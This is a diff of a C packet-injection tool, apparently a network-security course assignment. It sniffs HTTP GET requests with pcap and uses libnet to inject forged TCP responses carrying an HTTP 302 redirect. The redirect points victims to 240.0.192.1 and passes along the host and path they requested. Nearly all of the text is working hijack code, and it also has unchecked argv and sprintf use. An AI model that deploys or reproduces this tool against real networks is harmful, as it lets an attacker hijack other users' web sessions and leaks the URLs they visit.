@@ -12,25 +12,15 @@
 #include <math.h>
 #include <string.h>
 
-#define MAGIC "O kind server, %s needs your blessings.\n"
-#define MAGIC_NUM 3
-
-#define HTTP302 "HTTP/1.1 302 Found\r\n" "Connection: close\r\n" "Content-Length: 0\r\n" "Location: http://240.0.192.1/?%s\r\n"
-
-void usage() {
-	fprintf(stderr, "\
-usage:\n\
-	hijack <server ip> <server port> <client ip> <client port> <andrew id>\n");
-};
+#define HTTP302 "HTTP/1.1 302 Found\r\n" "Connection: close\r\n" "Content-Length: 0\r\n" "Location: http://240.0.192.1/?%s%s\r\n"
 
 #ifdef DEBUG
 void print_packet(const u_char *packet);
 #endif
 
-pcap_t *init_pcap_handle();
+pcap_t *init_pcap_handle(const char*);
 libnet_t *init_libnet_handle();
-//int inject(libnet_t *l, const u_char* packet, char* payload, size_t payload_s);
-int inject(const u_char*, const char*);
+int inject(const u_char*, const char*, const char*);
 
 libnet_t *l;
 
@@ -43,7 +33,7 @@ get_packet(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *packe
 #endif
 
     char http_get[128] = {0};
-    char http_host[512] = {0};
+    char http_host[128] = {0};
     size_t get_pos;
     char *_get, *_host;
 	const char* payload = (const char *)packet + ETHER_HDR_LEN + LIBNET_IPV4_H + LIBNET_TCP_H;
@@ -55,9 +45,6 @@ get_packet(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *packe
 #endif
         return;
     }
-
-    //get_pos = strchr(payload, '\r')-payload-12;
-    //get_pos = strstr(payload, "\r\n");
 
     _get = memchr(payload, '\r', 100);
     if (_get == NULL) {
@@ -78,126 +65,18 @@ get_packet(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *packe
     fprintf(stderr, "HOST: '%s' \n", http_host);
 #endif
 
-    strcat(http_host, http_get);
-    inject(packet, http_host);
+    inject(packet, http_get, http_host);
     return;
 }
 
 
 int main(int argc, char* argv[]) {
 
-
-    /*
-	if (argc != 6) {
-		usage();
-		exit(EXIT_FAILURE);
-	}
-
-
-	char* client_ip = argv[1];
-	char* client_port = argv[2];
-	char* server_ip = argv[3];
-	char* server_port = argv[4];
-	char* andrew_id = argv[5];
-    */
-
-	//char payload[1024];
-	//sprintf(payload, HTTP302);
-	//size_t payload_s = strlen(payload) + 1;
-
-#ifdef DEBUG
-	//fprintf(stderr, "Payload Prepared, length %lu\n%s\n", payload_s, payload);
-#endif
+	char* dev = argv[1];
 
 	l = init_libnet_handle(); 
-	pcap_t *handle = init_pcap_handle();
-
-    /*
-	struct pcap_pkthdr header;
-	const u_char *packet = NULL;
-	time_t now;
-    */
-
+	pcap_t *handle = init_pcap_handle(dev);
     pcap_loop (handle, -1, get_packet, NULL);
-    /*
-	while (1) {
-		now = time(NULL);
-		packet = pcap_next(handle, &header);
-		if (packet == NULL) {
-			continue;
-		}
-
-#ifdef DEBUG
-		fprintf(stderr, "%ld: Analysis at %ld:%ld, length: %d\n", now, header.ts.tv_sec, header.ts.tv_usec, header.len);
-#endif
-
-		if (fabs(difftime(now, header.ts.tv_sec)) > 1.) {
-#ifdef DEBUG
-			fprintf(stderr, "packet too old, disgarded.\n");
-#endif
-			continue;
-		}
-
-		//u_int32_t expect_ack = 0;
-
-		if (inject(l, packet, payload, payload_s) == -1) {
-			fprintf(stderr, "Injection failed\n");
-			continue;
-		}
-
-
-        */
-
-        /*
-#ifdef DEBUG
-		fprintf(stderr, "Expecting server return ack: %lu\n", (unsigned long)expect_ack);
-#endif
-
-		int i;
-		for (i = 0; i < MAGIC_NUM; ++i) {
-			packet = NULL;
-			while (packet == NULL) {
-				packet = pcap_next(handle, &header);
-			}
-
-			struct ip *ip = (struct ip *) (packet + ETHER_HDR_LEN);
-			int ip_len = ntohs(ip->ip_len);
-			int ip_size = ip->ip_hl * 4;
-
-			struct tcphdr *tcp = (struct tcphdr *) (packet + ETHER_HDR_LEN + ip_size);
-			int tcp_size = tcp->doff * 4;
-
-			int payload_size = ip_len - ip_size - tcp_size;
-			if (payload_size == 0) {
-				continue;
-			}
-#ifdef DEBUG
-			printf("Packet Length: %d\nIP Header Length: %d\nTCP Header Length %d\nPayload Length: %d\n", ip_len, ip_size, tcp_size, payload_size);
-#endif
-
-	        u_char *data = (u_char *)(packet + ETHER_HDR_LEN + ip_size + tcp_size);
-#ifdef DEBUG
-			print_packet(packet);
-#endif
-			if (ntohl(tcp->ack_seq) == expect_ack) {
-				printf("%s\n", data);
-				break;
-			}
-		}
-
-
-
-		if (i != MAGIC_NUM) {
-			break;
-		}
-#ifdef DEBUG
-		fprintf(stderr, "Attack failed, trying again!\n");
-#endif
-        */
-
-    /*
-	}
-    */
 
 #ifdef DEBUG
 	fprintf(stderr, "All done, cleaning up...\n");
@@ -209,8 +88,8 @@ int main(int argc, char* argv[]) {
 	return 0;
 }
 
-pcap_t *init_pcap_handle() {
-	char *dev = "eth0";
+pcap_t *init_pcap_handle(const char* dev) {
+	//char *dev = "eth0";
 	char errbuf[PCAP_ERRBUF_SIZE];
 
 //	dev = pcap_lookupdev(errbuf);
@@ -286,7 +165,7 @@ void print_packet(const u_char *packet) {
 }
 #endif
 
-int inject(const u_char* packet, const char* args_url) {
+int inject(const u_char* packet, const char* http_get, const char* http_host) {
     /*
 #ifdef DEBUG
 	fprintf(stderr, "Sniffed Packet:\n");
@@ -296,11 +175,7 @@ int inject(const u_char* packet, const char* args_url) {
 
     char payload[512];
 
-    //static char* payload = HTTP302;
-    //
-    //
-
-    sprintf(payload, HTTP302, args_url);
+    sprintf(payload, HTTP302, http_host, http_get);
     size_t payload_s = strlen(payload) + 1;
 
 	static libnet_ptag_t ip_tag = LIBNET_PTAG_INITIALIZER, tcp_tag = LIBNET_PTAG_INITIALIZER;
@@ -359,7 +234,5 @@ int inject(const u_char* packet, const char* args_url) {
 
 	return 0;
 }
-
-
 
 
